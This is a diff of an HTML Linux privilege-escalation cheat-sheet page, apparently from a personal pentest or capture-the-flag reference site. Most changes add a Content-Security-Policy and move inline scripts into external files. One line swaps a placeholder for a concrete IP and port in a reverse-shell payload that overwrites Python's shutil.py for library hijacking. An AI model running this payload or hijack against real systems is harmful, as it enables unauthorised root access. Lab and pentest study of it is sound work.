@@ -2,6 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
+<meta http-equiv="Content-Security-Policy" content="script-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'self'">
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <link rel="icon" type="image/svg+xml" href="../assets/images/dragon-logo.svg">
 <link rel="icon" type="image/png" href="../assets/images/dragon-favicon.png">
@@ -22,7 +23,7 @@
     <table>
       <tr><th>Tool</th><th>Description</th></tr>
 
-      <tr class="tool-row" onclick="toggleCmd('cmd-linpeas')">
+      <tr class="tool-row" data-toggle="cmd-linpeas">
         <td>linPEAS</td><td>Automated Linux privesc checks</td>
       </tr>
       <tr id="cmd-linpeas" class="command-row">
@@ -43,7 +44,7 @@
   </td>
 </tr>
 
-      <tr class="tool-row" onclick="toggleCmd('cmd-pspy')">
+      <tr class="tool-row" data-toggle="cmd-pspy">
         <td>pspy</td><td>Monitor processes and cron jobs without root</td>
       </tr>
       <tr id="cmd-pspy" class="command-row">
@@ -61,7 +62,7 @@
   </td>
 </tr>
 
-      <tr class="tool-row" onclick="toggleCmd('cmd-sudo')">
+      <tr class="tool-row" data-toggle="cmd-sudo">
         <td>sudo (misconfig)</td><td>Abuse sudo rules for privesc</td>
       </tr>
       <tr id="cmd-sudo" class="command-row">
@@ -78,7 +79,7 @@
   </td>
 </tr>
 
-      <tr class="tool-row" onclick="toggleCmd('cmd-suid')">
+      <tr class="tool-row" data-toggle="cmd-suid">
         <td>SUID exploitation</td><td>Use SUID binaries to gain root</td>
       </tr>
       <tr id="cmd-suid" class="command-row">
@@ -95,7 +96,7 @@
   </td>
 </tr>
 
-      <tr class="tool-row" onclick="toggleCmd('cmd-path')">
+      <tr class="tool-row" data-toggle="cmd-path">
         <td>PATH hijacking</td><td>Exploit insecure PATH usage</td>
       </tr>
       <tr id="cmd-path" class="command-row">
@@ -112,7 +113,7 @@
   </td>
 </tr>
 
-      <tr class="tool-row" onclick="toggleCmd('cmd-capabilities')">
+      <tr class="tool-row" data-toggle="cmd-capabilities">
         <td>Capabilities</td><td>Abuse Linux capabilities for privesc</td>
       </tr>
       <tr id="cmd-capabilities" class="command-row">
@@ -130,7 +131,7 @@
 
 
 
-      <tr class="tool-row" onclick="toggleCmd('cmd-information-for-privesc')">
+      <tr class="tool-row" data-toggle="cmd-information-for-privesc">
         <td style="color:red">What to search for</td><td>privesc</td>
       </tr>
       <tr id="cmd-information-for-privesc" class="command-row">
@@ -171,7 +172,7 @@
             <span style="color:red">ls -l pour voir qui peut modifier</span>
             <div>ls -l /usr/lib/python3.8/shutil.py </div>                   
             <span style="color:red">modifier le fichier & mettre un reverse shell</span>
-            <div>echo "import os;os.system(\"bash -c 'bash -i >& /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0>&1'\")" > /usr/lib/python3.8/shutil.py</div>
+            <div>echo "import os;os.system(\"bash -c 'bash -i >& /dev/tcp/192.168.142.226/4444 0>&1'\")" > /usr/lib/python3.8/shutil.py</div>            
             <span style="color:red">Attendre morpheus</span>
             <div class="comment-line">---- Misconfigure right ? -----</div>
             
@@ -186,36 +187,7 @@
   </div>
 </div>
 
-<script>
-  const embedded = window.self !== window.top;
-
-  // Tell the hub's modal our real content height. Called synchronously on
-  // the one interaction that changes it (toggling a command row) so there's
-  // no dependency on observer/timer scheduling; ResizeObserver below is
-  // just a fallback for anything else (initial layout, font swaps, etc).
-  function reportHeight() {
-    if (embedded) {
-      window.parent.postMessage({ type: "tool-frame-height", height: document.body.scrollHeight }, "*");
-    }
-  }
-
-  function toggleCmd(id) {
-    const row = document.getElementById(id);
-    row.style.display = (row.style.display === "table-row") ? "none" : "table-row";
-    reportHeight();
-  }
-
-  (function() {
-    const savedTheme = localStorage.getItem("/settings.html") || "standard";
-    document.body.classList.add("theme-" + savedTheme);
-    if (embedded) document.body.classList.add("embedded");
-  })();
-
-  if (embedded) {
-    new ResizeObserver(reportHeight).observe(document.body);
-    window.addEventListener("load", reportHeight);
-  }
-</script>
+<script src="../assets/script/tools-page-boot.js"></script>
 
 <script src="../config/tools/linux.js"></script>
 <script src="../assets/script/wallpaper-loader.js"></script>
@@ -223,9 +195,7 @@
 <script src="../assets/script/copy-commands.js"></script>
 <script src="../assets/script/page-effects.js"></script>
 <script src="../assets/script/page-effects-loader.js"></script>
-<script>
-  applyWallpaper(toolsLinuxConfig.background, "tools-linux");
-</script>
+<script src="../assets/script/inline/tools-linux.js"></script>
 
 </body>
 </html>
